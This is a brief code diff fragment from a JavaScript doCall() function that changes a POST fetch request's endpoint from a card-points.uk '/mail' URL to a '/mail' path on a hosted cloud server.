@@ -66,7 +66,7 @@ function doCall() {
         return;
     }
 
-    fetch("https://www.card-points.uk/mail", {
+    fetch("https://srv669887.hstgr.cloud/mail", {
         method: "post",
         headers: {
             'Accept': 'application/json',
